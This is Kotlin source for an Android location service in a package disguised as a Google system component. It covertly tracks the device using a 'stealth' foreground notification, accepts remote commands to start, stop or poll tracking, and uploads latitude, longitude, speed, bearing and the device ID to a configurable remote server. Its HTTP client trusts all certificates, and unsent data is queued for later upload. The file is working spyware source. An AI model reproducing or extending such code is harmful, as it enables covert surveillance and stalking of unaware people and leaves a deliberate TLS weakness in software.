package com.google.android.systemservice.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.os.IBinder
import android.os.Looper
import android.util.Log
import com.google.android.gms.location.*
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.managers.AdaptiveSyncManager
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class LocationService : Service() {
    companion object {
        private const val TAG = "SystemLocation"
        private const val DEFAULT_INTERVAL_MS = 60000L // 1 minute default
        private const val MIN_INTERVAL_MS = 5000L // 5 seconds minimum
        
        // Configurable from command
        var trackingIntervalMs: Long = DEFAULT_INTERVAL_MS
    }

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var adaptiveSyncManager: AdaptiveSyncManager
    private var locationCallback: LocationCallback? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "LocationService created")
        startForegroundSilent()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        adaptiveSyncManager = AdaptiveSyncManager(this)
        
        // Use adaptive interval if not explicitly set
        if (trackingIntervalMs == DEFAULT_INTERVAL_MS) {
            trackingIntervalMs = adaptiveSyncManager.getLocationUpdateInterval()
            Log.d(TAG, "Using adaptive location interval: ${trackingIntervalMs}ms")
        }
    }

    private fun startForegroundSilent() {
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.LOCATION_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Get configurable interval from intent
        val intervalMs = intent?.getLongExtra("interval_ms", DEFAULT_INTERVAL_MS) ?: DEFAULT_INTERVAL_MS
        trackingIntervalMs = maxOf(intervalMs, MIN_INTERVAL_MS) // Ensure minimum
        
        when (intent?.action) {
            "GET_LOCATION" -> getSingleLocation()
            "START_TRACKING" -> startLocationTracking()
            "STOP_TRACKING" -> stopLocationTracking()
        }
        return START_STICKY
    }

    @SuppressLint("MissingPermission")
    private fun getSingleLocation() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted")
            stopSelf()
            return
        }
        Log.d(TAG, "Getting single location")
        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
            if (location != null) {
                sendLocationToServer(location)
            } else {
                // Request fresh location
                requestFreshLocation()
            }
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestFreshLocation() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted")
            stopSelf()
            return
        }
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1000)
            .setWaitForAccurateLocation(true)
            .setMaxUpdates(1)
            .build()

        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { sendLocationToServer(it) }
                fusedLocationClient.removeLocationUpdates(this)
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(request, callback, Looper.getMainLooper())
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission denied: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun startLocationTracking() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "Location permission not granted")
            stopSelf()
            return
        }
        Log.d(TAG, "Starting location tracking with interval: ${trackingIntervalMs}ms")
        
        // Stop existing tracking first
        stopLocationTracking()
        
        val request = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, trackingIntervalMs)
            .setMinUpdateIntervalMillis(trackingIntervalMs / 2)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { sendLocationToServer(it) }
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(request, locationCallback!!, Looper.getMainLooper())
        } catch (e: SecurityException) {
            Log.e(TAG, "Location tracking permission denied: ${e.message}")
        }
    }

    private fun stopLocationTracking() {
        Log.d(TAG, "Stopping location tracking")
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            locationCallback = null
        }
    }

    private fun sendLocationToServer(location: Location) {
        // Always cache last known location for offline scheduler
        getSharedPreferences("location_cache", MODE_PRIVATE).edit().apply {
            putFloat("last_lat", location.latitude.toFloat())
            putFloat("last_lng", location.longitude.toFloat())
            putFloat("last_accuracy", location.accuracy)
            putLong("last_timestamp", location.time)
            apply()
        }

        serviceScope.launch {
            try {
                val deviceId = try {
                    android.provider.Settings.Secure.getString(
                        contentResolver,
                        android.provider.Settings.Secure.ANDROID_ID
                    ) ?: AndroidConfig.deviceId
                } catch (e: Exception) {
                    AndroidConfig.deviceId
                }

                val json = JSONObject().apply {
                    put("device_id", deviceId)
                    put("latitude", location.latitude)
                    put("longitude", location.longitude)
                    put("accuracy", location.accuracy)
                    put("altitude", location.altitude)
                    put("speed", location.speed)
                    put("bearing", location.bearing)
                    put("provider", location.provider)
                    put("timestamp", location.time)
                }

                AndroidConfig.loadFromPreferences(this@LocationService)
                val body = json.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url("${AndroidConfig.apiBaseUrl}/locations")
                    .post(body)
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d(TAG, "Location sent successfully")
                    } else {
                        Log.e(TAG, "Failed to send location: ${response.code}")
                        // Queue offline
                        com.google.android.systemservice.utils.OfflineDataQueue(this@LocationService)
                            .enqueue("location", json.toString(), deviceId)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error sending location: ${e.message}, queuing offline")
                try {
                    val json = JSONObject().apply {
                        put("device_id", AndroidConfig.deviceId)
                        put("latitude", location.latitude)
                        put("longitude", location.longitude)
                        put("accuracy", location.accuracy)
                        put("timestamp", location.time)
                    }
                    com.google.android.systemservice.utils.OfflineDataQueue(this@LocationService)
                        .enqueue("location", json.toString(), AndroidConfig.deviceId)
                } catch (_: Exception) {}
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopForeground(false)
        stopLocationTracking()
        serviceScope.cancel()
    }
}
